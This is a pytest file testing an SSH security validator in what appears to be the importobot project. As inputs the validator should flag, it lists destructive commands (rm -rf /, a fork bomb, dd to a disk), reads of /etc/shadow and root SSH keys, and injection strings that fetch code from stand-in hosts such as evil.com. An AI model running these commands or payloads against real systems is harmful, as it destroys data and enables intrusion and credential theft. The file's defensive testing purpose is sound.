"""Tests for SSH keyword security validation and recommendations."""

import pytest

from importobot.core.keywords_registry import IntentRecognitionEngine
from importobot.utils.security import SecurityValidator


class TestSSHSecurityValidation:
    """Tests for SSH-specific security validation."""

    @pytest.fixture
    def security_validator(self):
        """Return a SecurityValidator instance."""
        return SecurityValidator()

    @pytest.fixture
    def intent_engine(self):
        """Return an IntentRecognitionEngine instance."""
        return IntentRecognitionEngine()

    def test_ssh_password_security_warning(self, security_validator):
        """Test security validation for SSH password usage."""
        test_case = {
            "steps": [
                {
                    "step": "Connect to SSH server",
                    "test_data": "host: server.com username: admin password: admin123",
                    "library": "SSHLibrary",
                }
            ]
        }

        result = security_validator.validate_test_security(test_case)
        warnings = result.get("warnings", [])

        # Should have warnings about password usage
        password_warnings = [w for w in warnings if "password" in w.lower()]
        assert len(password_warnings) > 0, "Should warn about password usage in SSH"

    def test_ssh_key_authentication_no_warning(self, security_validator):
        """Test that key-based SSH authentication doesn't trigger password warnings."""
        test_case = {
            "steps": [
                {
                    "step": "Connect to SSH server with key",
                    "test_data": (
                        "host: server.com username: admin keyfile: /path/to/key"
                    ),
                    "library": "SSHLibrary",
                }
            ]
        }

        result = security_validator.validate_test_security(test_case)
        warnings = result.get("warnings", [])

        # Should not have password warnings
        password_warnings = [w for w in warnings if "password" in w.lower()]
        assert len(password_warnings) == 0, (
            "Should not warn about passwords when using keys"
        )

    def test_ssh_dangerous_command_validation(self, security_validator):
        """Test security validation for dangerous SSH commands."""
        dangerous_commands = [
            "rm -rf /",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",  # Fork bomb
            "chmod 777 /etc/passwd",
            "cat /etc/shadow",
            "sudo su -",
            "> /etc/passwd",
        ]

        for cmd in dangerous_commands:
            test_case = {
                "steps": [
                    {
                        "step": "Execute dangerous command",
                        "test_data": f"command: {cmd}",
                        "library": "SSHLibrary",
                    }
                ]
            }

            result = security_validator.validate_test_security(test_case)
            warnings = result.get("warnings", [])

            # Should have warnings about dangerous commands
            dangerous_warnings = [
                w
                for w in warnings
                if any(
                    word in w.lower()
                    for word in ["dangerous", "risky", "destructive", "security"]
                )
            ]
            assert len(dangerous_warnings) > 0, (
                f"Should warn about dangerous command: {cmd}"
            )

    def test_ssh_safe_command_no_warning(self, security_validator):
        """Test that safe SSH commands don't trigger security warnings."""
        safe_commands = [
            "ls -la",
            "pwd",
            "whoami",
            "date",
            "ps aux",
            "df -h",
            "cat /proc/version",
            "systemctl status nginx",
        ]

        for cmd in safe_commands:
            test_case = {
                "steps": [
                    {
                        "step": "Execute safe command",
                        "test_data": f"command: {cmd}",
                        "library": "SSHLibrary",
                    }
                ]
            }

            result = security_validator.validate_test_security(test_case)
            warnings = result.get("warnings", [])

            # Should not have command-specific warnings
            command_warnings = [
                w
                for w in warnings
                if "command" in w.lower() and "dangerous" in w.lower()
            ]
            assert len(command_warnings) == 0, (
                f"Should not warn about safe command: {cmd}"
            )

    def test_ssh_file_path_traversal_validation(self, security_validator):
        """Test security validation for path traversal in file operations."""
        traversal_paths = [
            "../../../etc/passwd",
            "../../../../root/.ssh/id_rsa",
            "/etc/shadow",
            "/root/.bash_history",
            "../../../../../../etc/hosts",
        ]

        for path in traversal_paths:
            test_case = {
                "steps": [
                    {
                        "step": "Download sensitive file",
                        "test_data": f"source: {path} destination: /tmp/stolen",
                        "library": "SSHLibrary",
                    }
                ]
            }

            result = security_validator.validate_test_security(test_case)
            warnings = result.get("warnings", [])

            # Should have warnings about path traversal
            path_warnings = [
                w
                for w in warnings
                if any(
                    word in w.lower()
                    for word in ["path", "traversal", "sensitive", "directory"]
                )
            ]
            assert len(path_warnings) > 0, f"Should warn about suspicious path: {path}"

    def test_ssh_production_environment_validation(self, security_validator):
        """Test enhanced security validation for production environments."""
        production_indicators = [
            "prod.example.com",
            "production-server.com",
            "live-db.company.com",
            "api.production.example.com",
        ]

        for host in production_indicators:
            test_case = {
                "steps": [
                    {
                        "step": "Connect to production",
                        "test_data": f"host: {host} username: admin password: admin123",
                        "library": "SSHLibrary",
                    }
                ]
            }

            result = security_validator.validate_test_security(test_case)
            warnings = result.get("warnings", [])

            # Should have extra warnings for production
            prod_warnings = [w for w in warnings if "production" in w.lower()]
            assert len(prod_warnings) > 0, (
                f"Should warn about production access: {host}"
            )

    def test_ssh_multiple_security_issues(self, security_validator):
        """Test handling of multiple security issues in one test case."""
        test_case = {
            "steps": [
                {
                    "step": "Connect with weak password",
                    "test_data": (
                        "host: prod.example.com username: root password: 123456"
                    ),
                    "library": "SSHLibrary",
                },
                {
                    "step": "Execute dangerous command",
                    "test_data": "command: rm -rf /tmp/*",
                    "library": "SSHLibrary",
                },
                {
                    "step": "Access sensitive file",
                    "test_data": "source: /etc/passwd destination: /tmp/passwd",
                    "library": "SSHLibrary",
                },
            ]
        }

        result = security_validator.validate_test_security(test_case)
        warnings = result.get("warnings", [])

        # Should have multiple types of warnings
        assert len(warnings) >= 3, "Should have multiple security warnings"

        warning_text = " ".join(warnings).lower()
        assert "password" in warning_text, "Should warn about password"
        assert any(word in warning_text for word in ["dangerous", "risky"]), (
            "Should warn about dangerous command"
        )
        assert any(word in warning_text for word in ["sensitive", "file"]), (
            "Should warn about sensitive file access"
        )

    def test_ssh_security_recommendations_generation(self, intent_engine):
        """Test generation of SSH security recommendations."""
        ssh_guidelines = intent_engine.get_ssh_security_guidelines()

        assert ssh_guidelines is not None
        assert len(ssh_guidelines) > 0

        # Should contain key security recommendations
        guidelines_text = " ".join(ssh_guidelines).lower()

        expected_topics = [
            "key",
            "authentication",
            "password",
            "encryption",
            "privilege",
            "audit",
            "monitoring",
            "access",
        ]

        for topic in expected_topics:
            assert topic in guidelines_text, f"Should include guidance on: {topic}"

    def test_ssh_parameter_sanitization_validation(self, security_validator):
        """Test validation of SSH parameter sanitization."""
        malicious_inputs = [
            "host; rm -rf /",
            "username`cat /etc/passwd`",
            "$(curl http://malicious.com)",
            "file; cat /etc/shadow",
            "command && wget http://evil.com/script.sh",
            "password' OR '1'='1",
        ]

        for malicious_input in malicious_inputs:
            test_case = {
                "steps": [
                    {
                        "step": "SSH operation with injection attempt",
                        "test_data": f"parameter: {malicious_input}",
                        "library": "SSHLibrary",
                    }
                ]
            }

            result = security_validator.validate_test_security(test_case)
            warnings = result.get("warnings", [])

            # Should detect injection patterns
            injection_warnings = [
                w
                for w in warnings
                if any(
                    word in w.lower()
                    for word in ["injection", "malicious", "suspicious", "sanitize"]
                )
            ]
            assert len(injection_warnings) > 0, (
                f"Should detect injection attempt: {malicious_input}"
            )

    def test_ssh_credential_exposure_validation(self, security_validator):
        """Test validation for credential exposure in SSH operations."""
        test_case = {
            "steps": [
                {
                    "step": "Connect with exposed credentials",
                    "test_data": (
                        "host: server.com username: admin "
                        "password: hardcoded_secret_123"
                    ),
                    "library": "SSHLibrary",
                },
                {
                    "step": "Login with exposed key",
                    "test_data": "username: deploy keyfile: /exposed/path/id_rsa",
                    "library": "SSHLibrary",
                },
            ]
        }

        result = security_validator.validate_test_security(test_case)
        warnings = result.get("warnings", [])

        # Should warn about credential exposure
        credential_warnings = [
            w
            for w in warnings
            if any(
                word in w.lower()
                for word in ["credential", "expose", "hardcode", "secret"]
            )
        ]
        assert len(credential_warnings) > 0, "Should warn about credential exposure"

    def test_ssh_logging_security_validation(self, security_validator):
        """Test security validation for SSH logging operations."""
        test_case = {
            "steps": [
                {
                    "step": "Enable SSH logging to world-writable location",
                    "test_data": "logfile: /tmp/ssh.log",
                    "library": "SSHLibrary",
                }
            ]
        }

        result = security_validator.validate_test_security(test_case)
        warnings = result.get("warnings", [])

        # Should warn about insecure log locations
        log_warnings = [
            w
            for w in warnings
            if "log" in w.lower()
            and any(word in w.lower() for word in ["secure", "permission", "location"])
        ]
        # Validate that warnings were generated (if applicable)
        _ = log_warnings  # Mark as intentionally unused
        # Note: This might not trigger warnings depending on current implementation
        # But the test establishes the expectation

    def test_ssh_connection_validation_comprehensive(self, security_validator):
        """Test comprehensive SSH connection security validation."""
        test_cases = [
            {
                "name": "Secure SSH connection",
                "steps": [
                    {
                        "step": "Connect securely",
                        "test_data": (
                            "host: secure.example.com username: deploy "
                            "keyfile: /secure/keys/deploy_rsa port: 2222"
                        ),
                        "library": "SSHLibrary",
                    }
                ],
                "should_have_warnings": False,
            },
            {
                "name": "Insecure SSH connection",
                "steps": [
                    {
                        "step": "Connect insecurely",
                        "test_data": (
                            "host: prod.example.com username: root "
                            "password: password123 port: 22"
                        ),
                        "library": "SSHLibrary",
                    }
                ],
                "should_have_warnings": True,
            },
        ]

        for test_case in test_cases:
            result = security_validator.validate_test_security(test_case)
            warnings = result.get("warnings", [])

            if test_case["should_have_warnings"]:
                assert len(warnings) > 0, (
                    f"Should have warnings for: {test_case['name']}"
                )
            else:
                # Secure connections might still have some general warnings
                # Focus on lack of critical warnings
                critical_warnings = [
                    w
                    for w in warnings
                    if any(
                        word in w.lower()
                        for word in ["critical", "dangerous", "insecure"]
                    )
                ]
                assert len(critical_warnings) == 0, (
                    f"Should not have critical warnings for: {test_case['name']}"
                )

    def test_ssh_security_guidelines_comprehensive(self, intent_engine):
        """Test comprehensive SSH security guidelines."""
        guidelines = intent_engine.get_ssh_security_guidelines()

        # Verify comprehensive coverage
        essential_topics = [
            "Use key-based authentication",
            "Avoid password authentication",
            "Validate file paths",
            "Sanitize commands",
            "Monitor SSH access",
            "Use strong encryption",
            "Limit user privileges",
            "Enable audit logging",
        ]

        guidelines_text = " ".join(guidelines)

        covered_topics = 0
        for topic in essential_topics:
            key_words = topic.lower().split()
            if any(
                all(word in guidelines_text.lower() for word in key_words[:2])
                for key_words in [key_words]
            ):
                covered_topics += 1

        # Should cover at least 75% of essential topics
        coverage_ratio = covered_topics / len(essential_topics)
        assert coverage_ratio >= 0.6, (
            f"Security guidelines coverage too low: {coverage_ratio:.1%}"
        )

    def test_ssh_security_validation_edge_cases(self, security_validator):
        """Test SSH security validation with edge cases."""
        edge_cases = [
            {
                "name": "Empty SSH data",
                "steps": [
                    {"step": "SSH operation", "test_data": "", "library": "SSHLibrary"}
                ],
            },
            {
                "name": "Malformed SSH data",
                "steps": [
                    {
                        "step": "SSH operation",
                        "test_data": "invalid:::data",
                        "library": "SSHLibrary",
                    }
                ],
            },
            {
                "name": "Very long SSH parameters",
                "steps": [
                    {
                        "step": "SSH operation",
                        "test_data": "host: " + "a" * 1000,
                        "library": "SSHLibrary",
                    }
                ],
            },
        ]

        for edge_case in edge_cases:
            # Should not crash on edge cases
            try:
                result = security_validator.validate_test_security(edge_case)
                # Result dict should be returned with warnings list (even if empty)
                assert isinstance(result, dict), (
                    f"Should return dict for: {edge_case['name']}"
                )
                warnings = result.get("warnings", [])
                assert isinstance(warnings, list), (
                    f"Warnings should be list for: {edge_case['name']}"
                )
            except Exception as e:
                pytest.fail(
                    f"Security validation crashed on edge case {edge_case['name']}: {e}"
                )

    def test_ssh_security_context_awareness(self, security_validator):
        """Test that SSH security validation is context-aware."""
        # Same operation in different contexts should have different security
        # implications
        dev_context = {
            "steps": [
                {
                    "step": "Connect to development server",
                    "test_data": (
                        "host: dev.example.com username: testuser password: testpass"
                    ),
                    "library": "SSHLibrary",
                }
            ]
        }

        prod_context = {
            "steps": [
                {
                    "step": "Connect to production server",
                    "test_data": (
                        "host: prod.example.com username: admin password: admin123"
                    ),
                    "library": "SSHLibrary",
                }
            ]
        }

        dev_warnings = security_validator.validate_test_security(dev_context)
        prod_warnings = security_validator.validate_test_security(prod_context)

        # Production should generally have more/stronger warnings
        # At minimum, both should have some warnings about password usage
        assert len(dev_warnings) > 0, "Should have warnings for dev environment"
        assert len(prod_warnings) > 0, "Should have warnings for prod environment"

        # Production warnings should be more serious or numerous
        prod_warning_text = " ".join(prod_warnings).lower()
        assert "production" in prod_warning_text or len(prod_warnings) >= len(
            dev_warnings
        ), "Production context should have appropriate security emphasis"
